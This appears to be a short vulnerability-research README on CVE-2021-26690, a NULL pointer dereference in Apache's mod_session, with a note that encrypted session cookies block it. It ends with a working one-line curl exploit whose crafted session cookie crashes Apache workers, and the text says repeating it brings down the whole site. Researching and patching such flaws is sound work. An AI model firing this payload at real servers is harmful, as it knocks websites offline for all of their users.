# Patch diffing for CVE-2021-26690 - Apache mod_session
This vulnerability is a NULL pointer dereference within the mod_session Apache's module.
It will cause a denial of service for the child processes of Apache's httpd.
By using a repetitive loop, each Apache workers will crash, leading to a denial of service for all clients that connect to or are connected to the website.

This vulnerability was initially discovered by @antonio-morales.

> For the full stages of the process, refer to the PDF in this repository.

# Limitation
If the server implements the SessionCryptoPassphrase option via `mod_session_crypto` the cookie will be encrypted and base64 encoded.
```
<IfModule mod_session.c>
Session On
SessionCookieName session path=/
SessionCryptoPassphrase "YourSecurePassphrase"
SessionMaxAge 1800
</IfModule>
```

In this case, the session cookie pairs cannot be tampered, and the denial of service cannot occur as is.

# Exploit

```bash
curl http://$IP:$PORT/ -v -b 'session=expiry=123456789&='
```
